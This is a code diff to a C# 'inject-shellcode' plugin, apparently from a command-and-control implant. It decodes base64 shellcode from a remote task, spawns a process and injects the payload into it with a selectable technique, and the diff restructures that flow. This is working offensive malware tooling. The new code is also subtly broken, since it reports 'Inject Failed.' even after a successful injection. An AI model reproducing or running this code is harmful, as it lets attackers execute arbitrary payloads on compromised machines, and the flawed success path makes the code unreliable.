@@ -11,22 +11,24 @@ namespace Agent
     {
         public string Name => "inject-shellcode";
         private IMessageManager messageManager { get; set; }
-        private ITechnique technique { get; set; }
+        private IAgentConfig config { get; set; }
+        //private ITechnique technique { get; set; }
         private ISpawner spawner { get; set; }
         private List<ITechnique> techniques = new List<ITechnique>();
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
         {
             this.messageManager = messageManager;
             this.spawner = spawner;
+            this.config = config;
             GetTechniques();
-            this.technique = techniques.Where(x => x.id == config.inject).FirstOrDefault();
+            //this.technique = techniques.Where(x => x.id == config.inject).FirstOrDefault();
         }
 
         public async Task Execute(ServerJob job)
         {
             InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);
 
-            if(!args.Validate(out var message))
+            if (!args.Validate(out var message))
             {
                 await messageManager.AddResponse(new ResponseResult()
                 {
@@ -41,24 +43,33 @@ namespace Agent
             //Create new process
             byte[] buf = Misc.Base64DecodeToByteArray(args.asm);
 
-            if (await this.spawner.Spawn(args.GetSpawnOptions(job.task.id)))
+            if (!await this.spawner.Spawn(args.GetSpawnOptions(job.task.id)))
             {
-                if(spawner.TryGetHandle(job.task.id, out var handle))
-                {
-                    if(technique.Inject(buf, handle.DangerousGetHandle()))
-                    {
-                        await messageManager.WriteLine("Injected", job.task.id, true);
-                        return;
-                    }
-                    await messageManager.WriteLine("Inject Failed.", job.task.id, true);
-                    return;
-                }
+                await messageManager.WriteLine("Process spawn failed.", job.task.id, true);
+                return;
+            }
 
+            if (!spawner.TryGetHandle(job.task.id, out var handle))
+            {
                 await messageManager.WriteLine("Failed to get handle for process", job.task.id, true);
                 return;
             }
 
-            await messageManager.WriteLine("Process spawn failed.", job.task.id, true);
+            var technique = techniques.Where(x => x.id == this.config.inject).FirstOrDefault();
+            if (technique is null)
+            {
+                Console.WriteLine("Failed to find injection technique.");
+                return;
+            }
+
+            if (!technique.Inject(buf, handle.DangerousGetHandle()))
+            {
+                await messageManager.WriteLine("Inject Failed.", job.task.id, true);
+                return;
+            }
+
+            await messageManager.WriteLine("Inject Failed.", job.task.id, true);
+            return;
         }
 
         private void GetTechniques()
@@ -70,12 +81,18 @@ namespace Agent
                 {
                     continue;
                 }
-
-                ITechnique technique = (ITechnique)Activator.CreateInstance(t);
-
-                if(technique is not null)
+                try
                 {
-                    techniques.Add(technique);
+                    ITechnique technique = (ITechnique)Activator.CreateInstance(t);
+
+                    if (technique is not null)
+                    {
+                        techniques.Add(technique);
+                    }
+                }
+                catch
+                {
+                    continue;
                 }
             }
         }
